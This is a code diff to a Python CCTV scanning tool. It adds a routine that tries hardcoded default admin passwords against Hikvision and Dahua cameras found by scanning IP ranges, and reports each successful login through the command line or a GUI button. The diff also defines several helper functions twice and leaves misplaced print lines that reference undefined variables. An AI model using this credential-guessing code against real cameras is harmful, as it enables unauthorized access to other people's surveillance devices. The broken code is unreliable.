@@ -22,6 +22,7 @@ import re
 import multiprocessing
 import subprocess
 import platform
+import random
 
 # Try to import colorama, but work without it (Termux compatibility)
 try:
@@ -30,16 +31,96 @@ try:
     HAS_COLOR = True
 except ImportError:
     HAS_COLOR = False
-    # Fallback color codes
     class Fore:
         GREEN = '\033[92m'
         RED = '\033[91m'
         YELLOW = '\033[93m'
         CYAN = '\033[96m'
         WHITE = '\033[97m'
-    
     class Style:
         RESET_ALL = '\033[0m'
+
+# Add requests and auth for login testing
+try:
+    import requests
+    from requests.auth import HTTPDigestAuth
+    import urllib3
+    # Disable SSL warnings for testing
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+    HAS_REQUESTS = True
+except ImportError:
+    HAS_REQUESTS = False
+
+# Default credentials to try
+DEFAULT_CREDENTIALS = [
+    ("admin", "admin123"),
+    ("admin", "admin1234"),
+    ("admin", "admin12345"),
+    ("admin", "admin1122"),
+    ("admin", "12345"),
+    ("admin", "123456"),
+    ("admin", "password"),
+]
+
+
+class HikvisionValidator:
+    """Validates Hikvision camera password using ISAPI protocol"""
+    DEVICE_INFO_ENDPOINT = "/ISAPI/System/deviceInfo"
+    
+    def __init__(self, ip, username, password, port=80):
+        self.ip = ip
+        self.username = username
+        self.password = password
+        self.port = port
+        self.timeout = 1.5 # Short timeout for speed
+    
+    def validate(self):
+        if not HAS_REQUESTS:
+            return False, "requests library not installed"
+        try:
+            url = f"http://{self.ip}:{self.port}{self.DEVICE_INFO_ENDPOINT}"
+            response = requests.get(
+                url,
+                auth=HTTPDigestAuth(self.username, self.password),
+                timeout=self.timeout,
+                verify=False,
+                allow_redirects=False
+            )
+            if response.status_code == 200:
+                return True, "Authenticated"
+            return False, f"HTTP {response.status_code}"
+        except Exception as e:
+            return False, str(e)
+
+
+class DahuaValidator:
+    """Validates Dahua/Anjhua camera password"""
+    MAGIC_BOX_ENDPOINT = "/cgi-bin/magicBox.cgi?action=getDeviceType"
+    
+    def __init__(self, ip, username, password, port=80):
+        self.ip = ip
+        self.username = username
+        self.password = password
+        self.port = port
+        self.timeout = 1.5 # Short timeout for speed
+    
+    def validate(self):
+        if not HAS_REQUESTS:
+            return False, "requests library not installed"
+        try:
+            url = f"http://{self.ip}:{self.port}{self.MAGIC_BOX_ENDPOINT}"
+            response = requests.get(
+                url,
+                auth=HTTPDigestAuth(self.username, self.password),
+                timeout=self.timeout,
+                verify=False,
+                allow_redirects=False
+            )
+            if response.status_code == 200:
+                return True, "Authenticated"
+            return False, f"HTTP {response.status_code}"
+        except Exception as e:
+            return False, str(e)
 
 # Configuration
 CCTV_OUTPUT = "CCTV_Found.txt"
@@ -64,6 +145,8 @@ def print_banner():
     width = 60
     internal_width = width - 2 # 58
     
+    glitch_intro()
+    
     banner = [
         "███╗   ███╗██╗   ██╗███████╗██╗ ██████╗ ███╗   ██╗",
         "████╗ ████║██║   ██║██╔════╝██║██╔═══██╗████╗  ██║",
@@ -74,7 +157,7 @@ def print_banner():
     ]
 
     # Hacking Green colors
-    green = "\033[92m"
+    green = "\033[38;5;46m" # Intense Neon Green
     red_warning = "\033[91m"
     reset = "\033[0m"
 
@@ -85,18 +168,21 @@ def print_banner():
         left_pad = (internal_width - len(line)) // 2
         right_pad = internal_width - len(line) - left_pad
         print(f"║{' ' * left_pad}{green}{line}{' ' * right_pad}║")
+        time.sleep(0.01) # Wipe effect
 
     print(f"║{' ' * internal_width}║")
     
-    warning_text = "⚠ WARNING: Do not use this tool without MSK's permission."
+    warning_text = "⚠ WARNING: USE FOR EDUCATIONAL PERMISSION ONLY"
     w_left_pad = (internal_width - len(warning_text)) // 2
     w_right_pad = internal_width - len(warning_text) - w_left_pad
     print(f"║{' ' * w_left_pad}{red_warning}{warning_text}{green}{' ' * w_right_pad}║")
     
     print(f"╚" + "═" * internal_width + f"╝{reset}")
 
-    print(f"{green}[*] Developed by: {Fore.YELLOW}MSK{reset}")
-    print(f"{green}[*] Termux Supported ✓{reset}\n")
+    loading_spinner(0.6, "Infiltrating")
+    typing_print(f"{green}[*] Developed by: {Fore.YELLOW}MSK{reset}", 0.01)
+    typing_print(f"{green}[*] Termux Status: {Fore.CYAN}ONLINE ✓{reset}", 0.01)
+    print()
 def validate_ip(ip_str):
     """Validate IP address format"""
     try:
@@ -174,6 +260,70 @@ def extract_title(html_content):
         return "No Title Found"
     except:
         return "Error Extracting Title"
+
+
+def typing_print(text, speed=0.005):
+    """Prints text character by character for a cinematic effect"""
+    for char in text:
+        sys.stdout.write(char)
+        sys.stdout.flush()
+        time.sleep(speed)
+    print()
+
+
+def glitch_intro():
+    """Short glitch-like effect before clearing the screen"""
+    chars = "!@#$%^&*()_+{}[]|;:,.<>?"
+    for _ in range(5):
+        glitch = "".join(random.choice(chars) for _ in range(60))
+        sys.stdout.write(f"\r{Fore.GREEN}{glitch}{Style.RESET_ALL}")
+        sys.stdout.flush()
+        time.sleep(0.04)
+    sys.stdout.write("\r" + " " * 60 + "\r")
+
+
+def loading_spinner(duration=0.8, task="Initializing"):
+    """Animated loading spinner for transitions"""
+    spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
+    end_time = time.time() + duration
+    while time.time() < end_time:
+        for char in spinner:
+            sys.stdout.write(f"\r{Fore.GREEN}[*] {task}... {char}{Style.RESET_ALL}")
+            sys.stdout.flush()
+            time.sleep(0.08)
+    sys.stdout.write("\r" + " " * 60 + "\r")
+
+
+def typing_print(text, speed=0.005):
+    """Prints text character by character for a cinematic effect"""
+    for char in text:
+        sys.stdout.write(char)
+        sys.stdout.flush()
+        time.sleep(speed)
+    print()
+
+
+def glitch_intro():
+    """Short glitch-like effect before clearing the screen"""
+    chars = "!@#$%^&*()_+{}[]|;:,.<>?"
+    for _ in range(5):
+        glitch = "".join(random.choice(chars) for _ in range(60))
+        sys.stdout.write(f"\r{Fore.GREEN}{glitch}{Style.RESET_ALL}")
+        sys.stdout.flush()
+        time.sleep(0.04)
+    sys.stdout.write("\r" + " " * 60 + "\r")
+
+
+def loading_spinner(duration=0.8, task="Initializing"):
+    """Animated loading spinner for transitions"""
+    spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
+    end_time = time.time() + duration
+    while time.time() < end_time:
+        for char in spinner:
+            sys.stdout.write(f"\r{Fore.GREEN}[*] {task}... {char}{Style.RESET_ALL}")
+            sys.stdout.flush()
+            time.sleep(0.08)
+    sys.stdout.write("\r" + " " * 60 + "\r")
 
 
 def get_camera_type(response_str, title, filter_mode=1):
@@ -373,6 +523,8 @@ def super_fast_scan(gui_start_ip=None, gui_end_ip=None, gui_filter_mode=None):
     cpu_count = multiprocessing.cpu_count()
     max_threads = min(500, cpu_count * 50)  # Scale with CPU cores
     
+    loading_spinner(0.8, "Deploying Threads")
+    
     print(f"{Fore.CYAN}[i] CPU Cores: {cpu_count}{Style.RESET_ALL}")
     print(f"{Fore.CYAN}[i] Threads: {max_threads}{Style.RESET_ALL}")
     print(f"{Fore.YELLOW}[*] Starting super fast scan...{Style.RESET_ALL}\n")
@@ -486,6 +638,15 @@ def super_fast_scan(gui_start_ip=None, gui_end_ip=None, gui_filter_mode=None):
             print(f"    URL: {Fore.WHITE}{r['url']}{Style.RESET_ALL}")
             print()
         
+        # Post-scan credential check for CLI
+        if gui_start_ip is None:
+            brute_forcible = [r for r in results if r['type'] in ["WEB SERVICE", "CPlus", "WEB"]]
+            if brute_forcible:
+                print(f"{Fore.YELLOW}[!] Found {len(brute_forcible)} cameras compatible with default credential testing.{Style.RESET_ALL}")
+                choice = input(f"{Fore.GREEN}Would you like to try default credentials on them? (y/n): {Style.RESET_ALL}").lower().strip()
+                if choice == 'y':
+                    brute_force_cameras(brute_forcible)
+        
         # Save to file
         try:
             with open("SuperFastScan_Results.txt", 'w', encoding='utf-8') as f:
@@ -506,6 +667,54 @@ def super_fast_scan(gui_start_ip=None, gui_end_ip=None, gui_filter_mode=None):
         print(f"{Fore.YELLOW}[!] No cameras found{Style.RESET_ALL}")
     
     print(f"\n{Fore.CYAN}[i] Total IPs scanned: {len(ip_list)}{Style.RESET_ALL}")
+    print(f"{Fore.CYAN}[i] Time taken: {elapsed:.2f} seconds{Style.RESET_ALL}")
+    return results
+
+
+def brute_force_cameras(camera_list, output_widget=None):
+    """Try default credentials on a list of cameras"""
+    def log(msg, color=Fore.GREEN):
+        if output_widget:
+            output_widget.insert('end', msg + "\n")
+            output_widget.see('end')
+        else:
+            print(f"{color}{msg}{Style.RESET_ALL}")
+
+    if not camera_list:
+        log("[-] No cameras to test.", Fore.YELLOW)
+        return
+
+    log(f"\n[*] Starting default credential test on {len(camera_list)} cameras...", Fore.YELLOW)
+    
+    success_count = 0
+    for cam in camera_list:
+        ip = cam['ip']
+        port = cam['port']
+        cam_type = cam['type']
+        
+        log(f"[*] Testing {ip}:{port} ({cam_type})...", Fore.CYAN)
+        
+        # Determine validator
+        is_dahua = "WEB SERVICE" == cam_type or "Dahua" in cam_type
+        
+        found_login = False
+        for user, pwd in DEFAULT_CREDENTIALS:
+            if is_dahua:
+                validator = DahuaValidator(ip, user, pwd, port)
+            else:
+                validator = HikvisionValidator(ip, user, pwd, port)
+            
+            success, msg = validator.validate()
+            if success:
+                log(f"    [+] SUCCESS: {ip}:{port} | {user}:{pwd}", Fore.GREEN)
+                success_count += 1
+                found_login = True
+                break
+        
+        if not found_login:
+            log(f"    [-] No match for {ip}:{port}", Fore.RED)
+            
+    log(f"\n[✓] Credential test complete. Found {success_count} matches.", Fore.GREEN)
     print(f"{Fore.CYAN}[i] Cameras found: {len(results)}{Style.RESET_ALL}")
     print(f"{Fore.CYAN}[i] Time taken: {elapsed:.2f} seconds{Style.RESET_ALL}")
     print(f"{Fore.CYAN}[i] Speed: {(len(ip_list)*2)/elapsed:.0f} ports/sec{Style.RESET_ALL}")
@@ -842,14 +1051,21 @@ def clear_screen():
 
 
 def print_menu():
-    """Print main menu"""
+    """Print main menu with cinematic wipe"""
     print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
-    print(f"{Fore.GREEN}Select Mode:{Style.RESET_ALL}")
+    typing_print(f"{Fore.GREEN}Select Mode:{Style.RESET_ALL}", 0.01)
     print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
-    print(f"{Fore.YELLOW}1.{Style.RESET_ALL} 🔍 Trace Route")
-    print(f"{Fore.RED}2.{Style.RESET_ALL} ⚡ SUPER FAST SCAN (Camera Scanner)")
-    print(f"{Fore.GREEN}3.{Style.RESET_ALL} 📷 Neighbours Camera Scanner")
-    print(f"{Fore.YELLOW}4.{Style.RESET_ALL} Exit")
+    
+    menu_ops = [
+        f"{Fore.YELLOW}1.{Style.RESET_ALL} 🔍 Trace Route",
+        f"{Fore.RED}2.{Style.RESET_ALL} ⚡ SUPER FAST SCAN (Camera Scanner)",
+        f"{Fore.GREEN}3.{Style.RESET_ALL} 📷 Neighbours Camera Scanner",
+        f"{Fore.YELLOW}4.{Style.RESET_ALL} Exit"
+    ]
+    
+    for op in menu_ops:
+        typing_print(op, 0.005)
+        
     print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}\n")
 
 
@@ -869,7 +1085,7 @@ def run_gui():
 
     # Hacker style styling
     bg_color = "black"
-    fg_color = "#00FF00"  # Neon green
+    fg_color = "#00FF00"  # Authentic CRT Green
     font_main = ("Consolas", 10)
     font_btn = ("Consolas", 12, "bold")
 
@@ -928,6 +1144,8 @@ def run_gui():
     sys.stdout = StdoutRedirector(txt_out)
     sys.stderr = sys.stdout
 
+    found_cameras_store = []
+
     def run_in_thread(target, *args):
         # Disable buttons while running
         for btn in buttons:
@@ -935,8 +1153,11 @@ def run_gui():
         txt_out.delete(1.0, tk.END)
         
         def thread_task():
+            nonlocal found_cameras_store
             try:
-                target(*args)
+                res = target(*args)
+                if isinstance(res, list):
+                    found_cameras_store = res
             except Exception as e:
                 print(f"\nError: {e}")
             finally:
@@ -972,6 +1193,17 @@ def run_gui():
     def do_neighbours_camera_scanner():
         run_in_thread(neighbours_camera_scanner)
 
+    def do_brute_force():
+        brute_forcible = [r for r in found_cameras_store if r.get('type') in ["WEB SERVICE", "CPlus", "WEB"]]
+        if not brute_forcible:
+            messagebox.showinfo("Wait", "No compatible cameras found in last scan.\n(Compatible: WEB, WEB SERVICE, CPlus)", parent=root)
+            return
+        
+        if not messagebox.askyesno("Confirm", f"Try default credentials on {len(brute_forcible)} found cameras?", parent=root):
+            return
+            
+        run_in_thread(brute_force_cameras, brute_forcible, txt_out)
+
     btn_frame = tk.Frame(root, bg="black")
     btn_frame.pack(fill=tk.X, pady=10)
 
@@ -991,6 +1223,11 @@ def run_gui():
                      bg="#111111", fg=fg_color, font=font_btn, relief=tk.FLAT, activebackground="#222222", activeforeground=fg_color)
     btn3.pack(side=tk.LEFT, expand=True, padx=5)
     buttons.append(btn3)
+
+    btn4 = tk.Button(btn_frame, text="🔑 Try Credentials", command=do_brute_force, 
+                     bg="#111111", fg="#FFFF00", font=font_btn, relief=tk.FLAT, activebackground="#222222", activeforeground="#FFFF00")
+    btn4.pack(side=tk.LEFT, expand=True, padx=5)
+    buttons.append(btn4)
 
     print("[*] GUI Loaded successfully. Welcome to MSK Camera Scanner.")
     root.mainloop()
